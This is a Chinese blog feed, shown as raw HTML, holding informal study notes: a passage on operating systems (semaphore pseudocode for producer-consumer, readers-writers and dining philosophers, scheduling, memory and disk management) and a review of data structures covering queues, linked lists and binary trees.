<p>这里就写伪代码了…</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token comment" spellcheck="true">// Producer:</span>
nextp <span class="token operator">=</span> <span class="token function">produce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">wait</span><span class="token punctuation">(</span>empty<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">wait</span><span class="token punctuation">(</span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>

Buffer<span class="token punctuation">[</span>in_ptr<span class="token punctuation">]</span> <span class="token operator">=</span> nextp<span class="token punctuation">;</span>
in_ptr <span class="token operator">=</span> <span class="token punctuation">(</span>in_ptr <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> n<span class="token punctuation">;</span>

<span class="token function">signal</span><span class="token punctuation">(</span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">signal</span><span class="token punctuation">(</span>full<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">// Customer:</span>
<span class="token function">wait</span><span class="token punctuation">(</span>full<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">wait</span><span class="token punctuation">(</span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>

nextc <span class="token operator">=</span> <span class="token function">buffer</span><span class="token punctuation">(</span>out_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
out_ptr <span class="token operator">=</span> <span class="token punctuation">(</span>out_ptr <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> n<span class="token punctuation">;</span>

<span class="token function">signal</span><span class="token punctuation">(</span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">signal</span><span class="token punctuation">(</span>empty<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>注意的点在于上面不光是有<code>full/signal</code>这个….还同时有<code>mutex</code>…为什么呢<br>这个<code>mutex</code>是设定了同时只有生产者或者消费者在运作,就是使得在生产的时候不能消费,在消费的时候不能生产,即一个互斥的关系<br>这个<code>full/signal</code>的话就是说对资源的同步….</p>
<p>如果我们改变这个问题呢….<br>比如</p>
<ol>
<li><p>多生产者, 单消费者, 多缓冲区<br>其实和上面的单生产单消费多缓冲一样的</p>
</li>
<li><p>多生产者, 多消费者, 单缓冲<br>单缓冲的话, 其实就不需要mutex了,这个时候full和signal就代替了mutex的作用</p>
</li>
<li><p>单生产者, 单消费者, 单缓冲<br>感觉只要是单缓冲的话, 就很简单了, 和几个生产几个消费好像没关系了, 就是和上一个应该是完全相同的</p>
</li>
<li><p>允许生产者写的时候消费者读<br>这个时候, 第一想到就是不需要mutex了,其实不然…只是可以Producer和Customer一起进行了, 但同类之间还是互斥的,这个时候, 解决方法是设置<code>mutex_Producer</code>和<code>mutex_Customer</code>…程序大概变成了这个样子</p>
</li>
</ol>
<pre class="line-numbers language-c"><code class="language-c"><span class="token comment" spellcheck="true">// Producer:</span>
<span class="token function">wait</span><span class="token punctuation">(</span>empty<span class="token punctuation">)</span>
<span class="token function">wait</span><span class="token punctuation">(</span>mutex_Producer<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">// 生产</span>
<span class="token function">singal</span><span class="token punctuation">(</span>mutex_Producer<span class="token punctuation">)</span>
<span class="token function">singal</span><span class="token punctuation">(</span>full<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">// Customer:</span>
<span class="token function">wait</span><span class="token punctuation">(</span>full<span class="token punctuation">)</span>
<span class="token function">wait</span><span class="token punctuation">(</span>mutex_Customer<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">// 生产</span>
<span class="token function">singal</span><span class="token punctuation">(</span>mutex_Customer<span class="token punctuation">)</span>
<span class="token function">singal</span><span class="token punctuation">(</span>empty<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ol>
<li>调整wait/signal顺序<br>生产者的wait调换的话, 缓冲区为满时候生产者继续运行时候会产生死锁<br>消费者的wait调换的话, 缓冲区为空时候消费者继续运行时候会产生死锁</li>
</ol>
<p>而signal的话是可以互换的…不会有问题, 但有的地方有这样子的话:对任何信号量的wait与signal操作必须配对。同一进程中的多对wait与signal语句只能嵌套，不能交叉, 不太懂</p>
<p>所以总结出来就是那个. wait的话,一定要先wait一个资源型信号量, 然后再wait互斥型的</p>
<p>暂时先看其他的, 先挖个坑</p>
<h4 id="经典问题"><a href="#经典问题" class="headerlink" title="经典问题"></a>经典问题</h4><ol>
<li><p>生产者消费者问题<br>上面已经说到的</p>
</li>
<li><p>读者写者问题<br>这个和消费者生产者不太一样的地方在于,这个没有明确资源是什么…就是不需要考虑full和empty的问题, 只是要考虑</p>
</li>
<li>写者写的时候不允许其他写者写或者读</li>
<li>但允许多个读者同时访问资源</li>
<li>并没有产品产品/缓冲区的概念, 也就不需要说先写出东西来再去读取</li>
</ol>
<p>拿到问题后一种想法就是, 我们好像只要有一个互斥量wmutex就可以了,当第一个读者开始读取时候wait一个, 最后一个读者离开时候signal一下…每个写者都要独自的wait和signal<br>所以初步写出程序大概</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token comment" spellcheck="true">// 读者</span>
<span class="token keyword">if</span><span class="token punctuation">(</span>readcount <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token function">wait</span><span class="token punctuation">(</span>wmutex<span class="token punctuation">)</span><span class="token punctuation">;</span>

readcount <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">// 读操作</span>
readcount <span class="token operator">-</span><span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span>readcount <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token function">signal</span><span class="token punctuation">(</span>wmutex<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">// 写者</span>
<span class="token function">wait</span><span class="token punctuation">(</span>wmutex<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">// 写操作</span>
<span class="token function">signal</span><span class="token punctuation">(</span>wmutex<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>表面上看起来很和谐, 其实有个问题就是这里的<code>readcount</code>也是一个临界变量不能由多个read来访问…所以应该在readcount修改前后也变成临界区</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token comment" spellcheck="true">// 读者</span>
<span class="token function">wait</span><span class="token punctuation">(</span>rmutex<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>readcount <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token function">wait</span><span class="token punctuation">(</span>wmutex<span class="token punctuation">)</span><span class="token punctuation">;</span>
    readcount <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token function">signal</span><span class="token punctuation">(</span>rmutex<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">// 读操作</span>

<span class="token function">wait</span><span class="token punctuation">(</span>rmutex<span class="token punctuation">)</span><span class="token punctuation">;</span>
    readcount <span class="token operator">-</span><span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>readcount <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token function">signal</span><span class="token punctuation">(</span>wmutex<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">signal</span><span class="token punctuation">(</span>rmutex<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ol>
<li>哲学家进餐问题<br>关键在于资源申请的时候如果每个人都先申请同一只手的筷子的话…就很容易死锁, 所以应该有个人反着拿</li>
</ol>
<pre class="line-numbers language-c"><code class="language-c"><span class="token comment" spellcheck="true">// philosopher[0..3]</span>
<span class="token function">wait</span><span class="token punctuation">(</span>chopsticks<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">wait</span><span class="token punctuation">(</span>chopsticks<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">// eat</span>
<span class="token function">signal</span><span class="token punctuation">(</span>chopsticks<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">signal</span><span class="token punctuation">(</span>chopsticks<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">// philosopher[4]</span>
<span class="token function">wait</span><span class="token punctuation">(</span>chopsticks<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">wait</span><span class="token punctuation">(</span>chopsticks<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">// eat</span>
<span class="token function">signal</span><span class="token punctuation">(</span>chopsticks<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">signal</span><span class="token punctuation">(</span>chopsticks<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="进程通信"><a href="#进程通信" class="headerlink" title="进程通信"></a>进程通信</h3><ol>
<li>共享存储器系统</li>
<li>消息方式</li>
<li>管道方式</li>
</ol>
<h3 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h3><p>引入线程后, 进程仍然作为资源分配的基本单位…但线程作为调度分配的基本单位<br>线程之间共享进程中的大部分资源, 少部分像堆栈, 寄存器, TLS是独有的…</p>
<p>好处</p>
<ul>
<li>统一进程内的线程共享内核和文件, 相互通信无须调用内核</li>
<li>创建一个新的线程花费时间少</li>
<li>两线程切换花费时间少</li>
</ul>
<p>类型</p>
<ul>
<li>内核级线程</li>
<li>用户级线程<br>既然用户级线程没法分配到独立的处理机, 那这种线程的意义在于哪里</li>
</ul>
<p>特权指令一般能引起CPU系统态和用户态的转变</p>
<h2 id="处理机调度"><a href="#处理机调度" class="headerlink" title="处理机调度"></a>处理机调度</h2><h3 id="三个调度等级"><a href="#三个调度等级" class="headerlink" title="三个调度等级"></a>三个调度等级</h3><ol>
<li><p>低级调度<br>决定哪个进程获得处理机, 这里的话其实有抢占式和非抢占式两种</p>
</li>
<li><p>中级调度<br>中级的话其实就是挂起操作, 把暂时不需要的进程调到外存上…<br>实际上就是传说中内存管理中的<code>对换</code></p>
</li>
<li><p>高级调度<br>把外存上处于后备队列的作业调入内存, 并且为其创建进程, 分配资源, 然后把新的进程丢到那个就绪队列上, 准备执行</p>
</li>
</ol>
<h3 id="评价标准"><a href="#评价标准" class="headerlink" title="评价标准"></a>评价标准</h3><p>对于某个特定进程说</p>
<ol>
<li>周转时间, 包括</li>
</ol>
<ul>
<li>作业在后备队列的等待时间</li>
<li>进程在就绪队列的等待时间</li>
<li>进程在CPU上的执行时间</li>
<li>进程等待IO的时间</li>
</ul>
<ol>
<li>对于操作系统</li>
</ol>
<ul>
<li><p>平均周转时间<br> 各个进程周转时间的均值</p>
</li>
<li><p>平均带权周转时间<br> 每个进程时间带上权值</p>
<pre><code> W = 1/n * (\sum_{i=1}^n T_i / T_{si})   //我就这样子乱写了...
</code></pre><p> 这个<code>T_i</code>是第i个作业周转时间, 包括上面的四个过程<br> <code>T_{si}</code>是第i个作业的要求服务时间, 只包括周转时间的第三第四个过程</p>
</li>
</ul>
<h3 id="调度算法"><a href="#调度算法" class="headerlink" title="调度算法"></a>调度算法</h3><p>调度实际上就是资源分配</p>
<h4 id="先来先服务-FCFS"><a href="#先来先服务-FCFS" class="headerlink" title="先来先服务(FCFS)"></a>先来先服务(FCFS)</h4><p>用于作业调度/进程调度</p>
<h4 id="短作业-短进程优先-SJF-SPF"><a href="#短作业-短进程优先-SJF-SPF" class="headerlink" title="短作业/短进程优先(SJF/SPF)"></a>短作业/短进程优先(SJF/SPF)</h4><p>用于作业调度/进程调度<br>困难的点在于难以估计执行时间</p>
<h4 id="高优先权优先"><a href="#高优先权优先" class="headerlink" title="高优先权优先"></a>高优先权优先</h4><p>又分为</p>
<ul>
<li>动态优先权</li>
<li>静态优先权</li>
</ul>
<p>其实上面说的先来先服务, 短作业都是分别把到来时间, 执行时间作为优先权的高优先权优先算法, 而下面的高响应比优先相当于把响应比作为优先级</p>
<h4 id="高响应比优先"><a href="#高响应比优先" class="headerlink" title="高响应比优先"></a>高响应比优先</h4><p>只是用于作业调度</p>
<p>响应比 = <code>响应时间 / 要求服务时间</code> = <code>(等待时间 + 要求服务时间) / 要求服务时间</code></p>
<h4 id="时间片轮转"><a href="#时间片轮转" class="headerlink" title="时间片轮转"></a>时间片轮转</h4><p>时间片选择: 一般是略大于完成一次典型交互需要的时间</p>
<h4 id="多级反馈队列"><a href="#多级反馈队列" class="headerlink" title="多级反馈队列"></a>多级反馈队列</h4><p>无心学习…累</p>
<h4 id="实时系统的调度"><a href="#实时系统的调度" class="headerlink" title="实时系统的调度"></a>实时系统的调度</h4><h3 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h3><p>这一块的核心在于这里的银行家算法<br>定义: 由于资源分配造成的一种僵局…陷入僵局..僵局<br>死锁的进程处于阻塞状态, 但仅靠自己, 无法继续运行</p>
<p>就像我们前面的生产者消费者问题当调换wait操作, 如果先申请互斥, 然后申请资源, 就可能造成死锁<br>还有哲学家进餐, 如果每个人都同时拿左手/右手边筷子就可能死锁</p>
<h4 id="死锁特征"><a href="#死锁特征" class="headerlink" title="死锁特征"></a>死锁特征</h4><ol>
<li><p>互斥条件</p>
</li>
<li><p>请求和保持<br>就是进程占有一个资源的同时, 请求另外的资源</p>
</li>
<li><p>不可剥夺<br>进程的资源在使用完之前不能剥夺….也就是说被占有就被占有了不能转让</p>
</li>
<li><p>环路等待</p>
</li>
</ol>
<h2 id="存储器管理"><a href="#存储器管理" class="headerlink" title="存储器管理"></a>存储器管理</h2><p>寄存器和主存称可执行存储器<br>其实程序从编译到运行, 经历了<br>编译, 装载, 运行<br>而链接根据不同的链接方式可能发生在不同的时候</p>
<h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><ul>
<li>编译时链接</li>
<li>装载时链接</li>
<li>运行时链接</li>
</ul>
<h3 id="分区分配算法"><a href="#分区分配算法" class="headerlink" title="分区分配算法"></a>分区分配算法</h3><ul>
<li>首次适应算法</li>
<li>循环首次适应算法</li>
<li>最佳适应算法</li>
<li>最坏适应算法</li>
</ul>
<h3 id="基本分页存储管理"><a href="#基本分页存储管理" class="headerlink" title="基本分页存储管理"></a>基本分页存储管理</h3><p>由于这个分区分配方案存在碎片问题</p>
<h3 id="基本分段存储管理"><a href="#基本分段存储管理" class="headerlink" title="基本分段存储管理"></a>基本分段存储管理</h3><p>由于分页式存在的问题:</p>
<ul>
<li>信息共享和保护不方便</li>
<li>编程不方便(哪里不方便)</li>
</ul>
<p>分段式的话, 把具有相同功能的程序段放在了一起, 这样子可以很方便的设置每一段的权限之类的, 所以说感觉分段更适合逻辑地址空间的管理</p>
<p>分段的特点:</p>
<ul>
<li>分段是一段有意义的信息集合, 所以也容易实现信息保护</li>
<li>分段的划分由程序员来完成</li>
<li>分段长度不定</li>
<li>指令不存在跨分段情况</li>
</ul>
<p>这四个特点其实就是分段和分页的不同之处, 对吧</p>
<p>但分段的问题在于, 存在碎片…</p>
<h3 id="段页式存储管理"><a href="#段页式存储管理" class="headerlink" title="段页式存储管理"></a>段页式存储管理</h3><p>综合分段和分页的优点<br>做法大概是, 先分段, 之后在分的段上再把他分成一页一页的, 这样子零头就小于一页了….</p>
<h2 id="虚拟存储器管理"><a href="#虚拟存储器管理" class="headerlink" title="虚拟存储器管理"></a>虚拟存储器管理</h2><p>内存管理的两个问题</p>
<ul>
<li>大作业在小主存上运行</li>
<li>在给定大小的主存上运行更多的程序</li>
</ul>
<p>这个时候就向不把所有代码同时装入主存, 等需要时候再装入, 这样子的话就能实现我们的目的, 之所以可以这样做, 是因为程序运行的局部性原理<br>这样子形成的虚拟存储器就好像拥有更大的存储空间一样</p>
<p>虚拟存储器定义:<br>指的是具有<code>请求调用</code>和<code>置换</code>功能, 能从逻辑上对内存容量进行扩充的一种存储器<br>逻辑容量接近于内外存之和, 速度接近内存, 价格接近外存</p>
<blockquote>
<p>其实从这样子看的话, CPU里的Cache和主存其实也构成了类似的结构</p>
</blockquote>
<p>特点:</p>
<ul>
<li>多次性</li>
<li>对换性</li>
<li>虚拟性</li>
</ul>
<p>分别在分页, 分段, 段页式的基础上进行虚拟化, 就得到了三种虚拟存储器<br>请求分段, 请求分页, 段页式虚拟</p>
<p><em>抖动现象</em></p>
<h4 id="页面置换算法"><a href="#页面置换算法" class="headerlink" title="页面置换算法"></a>页面置换算法</h4><ul>
<li>最佳置换算法( OPT算法)</li>
<li>先进先出算法( FIFO算法)</li>
<li>最久未使用页面置换算法( LRU算法)</li>
<li>Clock置换算法</li>
</ul>
<p>硬件支持</p>
<h2 id="设备管理"><a href="#设备管理" class="headerlink" title="设备管理"></a>设备管理</h2><p>这里就是说的I/O系统的管理</p>
<h3 id="控制方式"><a href="#控制方式" class="headerlink" title="控制方式"></a>控制方式</h3><ul>
<li>程序轮询</li>
<li>中断</li>
<li>DMA方式</li>
<li>通道</li>
</ul>
<h3 id="设备分配"><a href="#设备分配" class="headerlink" title="设备分配"></a>设备分配</h3><p>设备分类</p>
<ul>
<li>独占设备</li>
<li>共享设备</li>
<li>虚拟设备<br>虚拟设备是通过某种技术把一台独占的设备编程能供若干用户共享的设备</li>
</ul>
<h3 id="设备独立性"><a href="#设备独立性" class="headerlink" title="设备独立性"></a>设备独立性</h3><p>用户程序独立于具体使用的物理设备, 其实是通过加了一层虚拟层来实现的<br>应用虚拟技术,让我们建立虚拟设备, 并且之后的操作可以都通过操作虚拟设备来实现</p>
<h3 id="SPOOLing技术"><a href="#SPOOLing技术" class="headerlink" title="SPOOLing技术"></a>SPOOLing技术</h3><h3 id="磁盘"><a href="#磁盘" class="headerlink" title="磁盘"></a>磁盘</h3><p>磁盘访问时间 <code>T = Ts + Tr + Tt</code>, 其中<br>Ts: 寻道时间 <code>Ts = 8 ~ 10ms</code><br>Tr: 旋转延迟 <code>Tr = 1 / (2r)</code><br>Tt: 传输时间 <code>Tt = b / (rN)</code><br><code>r: 转速; N: 每磁道字节数; b: 传输字节数</code><br>并且有: <code>Ts &gt; Tr &gt;&gt; Tt</code></p>
<p>时间耗费主要是在寻道上, 所以磁盘调度的目标在于使得平均寻道时间最短</p>
<p>磁盘调度算法</p>
<ul>
<li>先来先服务FCFS</li>
<li>最短寻道时间优先SSTF</li>
<li>SCAN 某同扫描算法</li>
<li>CSCAN 这个是循环扫描<br>这个CSCAN是单向的, 只在一个方向上满足磁道访问请求</li>
</ul>
<p>其实发现调度算法最常见的两种就是先来先服务和短时间优先</p>
<h2 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h2><h2 id="操作系统接口"><a href="#操作系统接口" class="headerlink" title="操作系统接口"></a>操作系统接口</h2>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[数据结构复习]]></title>
      <url>/2017/08/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/</url>
      <content type="html"><![CDATA[<p>其实主要是记一些名词</p>
<h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><p>没什么好说的.用数组模拟即可</p>
<h3 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h3><ul>
<li>括号配对, 自己写了一下, 不难, 但好久不做题, 手有点生</li>
<li>进行四则运算, 待写</li>
<li>DFS, 实际拿函数递归来实现</li>
</ul>
<h2 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h2><p>和栈差不多…但是有一些细节. 就是为了有效利用空间, 要使用循环队列…队尾放满了要折回去放到头, 所以有个取膜的操作</p>
<h3 id="数据成员"><a href="#数据成员" class="headerlink" title="数据成员"></a>数据成员</h3><pre class="line-numbers language-c"><code class="language-c">nptr front  <span class="token comment" spellcheck="true">// 头指针</span>
nptr rear   <span class="token comment" spellcheck="true">// 尾指针</span>
element data<span class="token punctuation">[</span>maxlen<span class="token punctuation">]</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><p>入队</p>
<pre class="line-numbers language-c"><code class="language-c">rear <span class="token operator">=</span> <span class="token punctuation">(</span>rear <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> maxlen
data<span class="token punctuation">[</span>rear<span class="token punctuation">]</span> <span class="token operator">=</span> ele<span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>出队</p>
<pre class="line-numbers language-c"><code class="language-c">front <span class="token operator">=</span> <span class="token punctuation">(</span>front <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> maxlen
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="循环队列里存在的问题"><a href="#循环队列里存在的问题" class="headerlink" title="循环队列里存在的问题"></a>循环队列里存在的问题</h3><p>循环队列解决了空间利用不是很有效的问题, 但是与此同时, 带来了新的问题…<br>就是队列空和队列满没办法区分<br>因为判断条件都是<code>front == rear</code></p>
<p>解决方法:</p>
<ul>
<li><p>增设操作标志, 当首尾指针相等时<br>如果进行了入队操作, 那么队列满<br>如果进行了出队操作, 那么队列空</p>
</li>
<li><p>约定一个保留空间<br>即空出来一个空间, 最多存放<code>maxlen - 1</code>个…, 这样子的话</p>
</li>
</ul>
<h3 id="应用-1"><a href="#应用-1" class="headerlink" title="应用"></a>应用</h3><p>杨辉三角<br>BFS</p>
<h2 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h2><h3 id="实现方式"><a href="#实现方式" class="headerlink" title="实现方式"></a>实现方式</h3><ul>
<li>静态链表, 数组实现</li>
<li>动态链表, 指针实现</li>
</ul>
<h3 id="应用-2"><a href="#应用-2" class="headerlink" title="应用"></a>应用</h3><ul>
<li><p>链栈<br>没什么好说的</p>
</li>
<li><p>链队列<br>增设头结点, 头尾指针都有方便操作<br>从头指针的地方出队, 从尾指针的地方入队<br>在出队时候要注意的点在于…当只剩下一个头结点的时候, 要把尾指针也置为front, 因为这个时候, rear本来是指向最后一个节点的, 但我们把最后一个节点删掉了,,,所以要rear指向开头</p>
</li>
</ul>
<h3 id="操作-待写"><a href="#操作-待写" class="headerlink" title="操作(待写)"></a>操作(待写)</h3><p>把链表就地逆置<br>链表合并(保持大小关系)</p>
<h2 id="线性表"><a href="#线性表" class="headerlink" title="线性表"></a>线性表</h2><h3 id="存储方式"><a href="#存储方式" class="headerlink" title="存储方式"></a>存储方式</h3><ul>
<li>顺序存储结构</li>
<li>链式存储结构<br>按照这样子的话, 栈, 队列, 线性表都有 顺序和链式的两种存储结构<h3 id="推广"><a href="#推广" class="headerlink" title="推广"></a>推广</h3>广义表: 每个元素可以是一个不可分割的原子, 也可能是一个表<br>这个..广义表有两种操作<br>head(A) 取表头：返回表A中第一个元素的值。<br>tail(A) 取表尾：返回表A中删除第一个元素后所得的表。<br>广义表的存储有几种方式:</li>
<li>链式存储结构</li>
<li>树/图表示</li>
</ul>
<h2 id="树"><a href="#树" class="headerlink" title="树"></a>树</h2><h3 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h3><ul>
<li>节点的度: 某节点的直接子节点的个数</li>
<li>树的度:   树中最大节点度</li>
<li>树的深度: 就是树中最深节点的高度</li>
</ul>
<blockquote>
<p>一个疑问就是. 深度和高度… 有的人说, 高度和深度一个是从下往上数的, 另一个则相反. 这个我也还不太知道</p>
</blockquote>
<h3 id="二叉树-amp-树"><a href="#二叉树-amp-树" class="headerlink" title="二叉树 &amp; 树"></a>二叉树 &amp; 树</h3><p>ppt里说, 二叉树, 节点左右不同就算两种状态, 而树的话就不是这样子了<br>左子树 &amp; 右子树这些都是,,,二叉树里的概念</p>
<h3 id="一个公式"><a href="#一个公式" class="headerlink" title="一个公式"></a>一个公式</h3><p>节点总数 = <code>\sum(n_i * i) + 1</code>…. 就是度数乘上拥有该度数的节点个数最后再加个1<br>这个主题好像没有<code>Mathjax</code>, 不能写latex公式就好坑啊</p>
<h2 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h2><p>单独拿出来, 看一下</p>
<h3 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h3><p>这里是把根节点作为第1层</p>
<ul>
<li>第i层的节点数 <code>&lt;= 2 ^ (i - 1)</code></li>
<li>高度为k的二叉树的节点总数 <code>&lt;= 2^k - 1</code></li>
<li>度为0, 1, 2的节点数量分别记为<code>n0, n1, n2</code>, 那么有<code>n0 = n2 + 1</code><br>推倒是: <code>n0 + n1 + n2 = n1 + 2*n2 + 1 = 节点总数</code></li>
</ul>
<p>所以对于二叉树的话,由于是<code>n0 = n2 + 1</code>, 所以只是需要有<code>n0, n1</code>, 或者<code>n2, n1</code>就能求出节点总数了</p>
<h3 id="满二叉树"><a href="#满二叉树" class="headerlink" title="满二叉树"></a>满二叉树</h3><p>高度为k, 并且有<code>2^k - 1</code>个节点的二叉树叫满二叉树</p>
<h3 id="完全二叉树"><a href="#完全二叉树" class="headerlink" title="完全二叉树"></a>完全二叉树</h3><p>在满二叉树中, 只有最后一层, 从右到左连续去掉了若干节点的二叉树<br>介绍一个概念, 肯定要有利用价值…对吧, 那完全二叉树的<em>优势</em>在于:<br>如果把根节点编号为1号, 那么树中某一节点编号i的两个子节点编号就是<code>2i</code>和<code>2i + 1</code></p>
<blockquote>
<p>需要注意的点, 就是根节点编号一定要是1, 不能是0…</p>
</blockquote>
<p>关于完全二叉树的两个结论</p>
<ul>
<li>有n个节点的完全二叉树的高度为<code>[logn] + 1</code>, 按照国际惯例, 是以2为底, 并且这里的取整函数是向下取整,比如, <code>2.多</code>也是取<code>2</code></li>
<li>如果孩子i有父亲, 那么孩子i的父亲编号应该是: <code>[i/2]</code>, 这里也是向下取整, 就是<code>i &gt;&gt; 2</code>, 对吧</li>
<li>度为1的节点最多有一个, 或者没有</li>
</ul>
<p>由于节点编号的特殊性, 所以完全二叉树可以使用数组来存…多么开心的一件事情</p>
<h3 id="几个题目"><a href="#几个题目" class="headerlink" title="几个题目"></a>几个题目</h3><ol>
<li><p>求100个节点的完全二叉树的叶子节点数<br>开始选用了, 很麻烦的做法, 算出了最后一层多少个叶子, 倒数第二层多少个, 然后加起来是总共50个…<br>好的解法应该是: 根据100号节点, 算出他的父亲是50号…所以, emmmm, 从51~100号都是叶子, 所以是50个…</p>
</li>
<li><p>完全二叉树第七层有10个节点…问共有多少节点, 有多少是叶子呢?<br>前6层有63个…对吧, 所以共有73个<br>然后最后一个节点编号是73了, 所以他爸爸是36号, 所以从<code>37 ~ 73</code>都是叶子, 共有37个</p>
</li>
<li><p>编号为i, j的两个节点在同一层的条件是: <code>[log(i)] = [log(j)]</code>, 依然是向下取整</p>
</li>
<li><p>LCA 最小公共祖先问题<br>baby暴力: 最容易想到的方法是, 从根节点分别走到i, j两节点, 并且记录下路径, 然后从头比较, 到第一个分叉的地方之前的那个节点就是最小公共祖先</p>
</li>
</ol>
<p>是不是上面的写法太暴力了…</p>
<p>暴力plus: 可以先dfs一下子…然后记下每个节点的父亲和深度….(其实…这个时候用bfs, dfs都可以是吗), 之后对于俩节点, 深度深的往上跳, 跳到和另一节点同一深度, 这个时候一起跳….当跳到同一点的时候就成功GG了. </p>
<p>暴力plusplus: 就是上面的暴力plus + 倍增, 倍增就是按照<code>2^n</code>这样子跳, 不是一下一下跳</p>
<blockquote>
<p>在DFS中, 一个度为n, 的节点一定会被访问(n + 1) 次, 因为会回溯n次</p>
</blockquote>
